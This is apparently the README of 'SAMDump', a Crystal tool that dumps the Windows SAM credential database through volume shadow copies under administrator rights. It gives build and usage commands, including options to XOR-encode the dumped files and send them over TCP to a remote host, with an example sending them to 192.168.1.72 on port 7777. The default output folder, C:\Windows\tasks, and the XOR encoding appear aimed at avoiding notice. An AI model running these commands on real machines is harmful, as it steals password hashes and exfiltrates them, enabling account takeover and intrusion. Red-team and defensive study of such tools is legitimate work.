# SAMDump — Crystal

Crystal implementation using C bindings for NT API calls and VSS COM interfaces.

## Requirements

- [Crystal](https://crystal-lang.org/) compiler (Windows)
- Administrator privileges

## Compilation

```
crystal build samdump.cs --release
```

## Usage

```
samdump.exe [OPTIONS]

Options:
  --save-local          Save files locally
  --output-dir <path>   Output directory (default: C:\Windows\tasks)
  --send-remote         Send files over TCP
  --host <ip>           Remote host (default: 127.0.0.1)
  --port <port>         Remote port (default: 7777)
  --xor-encode          XOR encode before save/send
  --xor-key <key>       XOR key (default: SAMDump2025)
  --disk <vol>          Volume for shadow copy (default: C:\)
  --shadow-device <dev> Use existing shadow device path (skip VSS)
  --help                Show help
```

### Save locally

```
samdump.exe --save-local --output-dir C:\temp
```

### Send to a remote server with XOR encoding

```
samdump.exe --send-remote --host 192.168.1.72 --port 7777 --xor-encode
```
